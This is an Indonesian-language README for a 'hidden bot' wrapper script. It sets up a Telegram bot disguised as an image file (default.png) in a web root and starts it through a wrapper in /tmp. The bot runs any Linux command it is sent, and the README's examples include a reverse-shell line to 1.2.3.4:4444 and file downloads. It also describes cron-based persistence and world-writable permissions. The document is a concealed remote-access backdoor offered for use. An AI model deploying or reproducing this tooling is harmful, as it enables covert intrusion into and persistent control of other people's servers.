# hidden bot Wrapper Script


</h1>
<h4 align="center">command list</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>
📌 Konsep Wrapper Script dalam Eksekusi Bot Telegram adalah, skrip perantara yang digunakan untuk menjalankan program atau skrip lain secara tidak langsung. Ini berguna untuk menyembunyikan, menyederhanakan, atau mengontrol eksekusi skrip utama.

Dalam kasus ini, kita memiliki:

Skrip utama (default.png) yang sebenarnya adalah bot Telegram, tetapi namanya disamarkan agar terlihat seperti file gambar.
Wrapper script (dockerbot), yang bertindak sebagai perantara untuk menjalankan default.png.

📂 Struktur File
```
/var/www/html/default.png  --> Skrip utama bot (disamarkan sebagai file gambar)
/tmp/img/dockerbot         --> Wrapper script untuk menjalankan default.png
```
📜 Isi Wrapper Script (dockerbot)
```
#!/bin/bash
/var/www/html/default.png
```

📌 Penjelasan:
```
#!/bin/bash → Menentukan bahwa skrip ini dijalankan menggunakan Bash.
/var/www/html/default.png → Memanggil skrip utama bot yang disamarkan sebagai file gambar.
Jadi, setiap kali dockerbot dijalankan, sebenarnya yang terjadi adalah default.png (yang merupakan bot Telegram) akan dieksekusi.
```
<br>
<br>
<br>
<br>


📌cara eksekusi
<br>
1️⃣ Buat file /tmp/img/dockerbot

Isi dengan:

```
#!/bin/bash
/sesuaikan/dengan/lokasi/botpng/default.png
```
2️⃣ Beri izin eksekusi
```
chmod 777 /tmp/img/dockerbot
```

3️⃣ menjalankan bot 

```
bash /tmp/img/dockerbot
```



apasaja yg bisa di jalankan di bot telegram

```
perintah Linux apa saja, termasuk:

✅ ls -la → Menampilkan daftar file dengan detail.
✅ wget http://example.com/file → Mengunduh file dari internet.
✅ curl -O http://example.com/file → Alternatif download selain wget.
✅ ps aux → Melihat daftar proses.
✅ netstat -tulnp → Melihat koneksi jaringan.
✅ whoami && id → Cek user dan grup aktif.
✅ bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 → Reverse shell ke listener.
✅ dan semua command linux 


🔥 Fitur systemd
✅ Monitoring bot setiap 5 menit menggunakan cronjob
✅ Jika bot mati, otomatis dijalankan ulang. otomatis
✅ Mengirim pesan saat bot mati (misalnya karena kill, CTRL+C, atau shutdown)

```
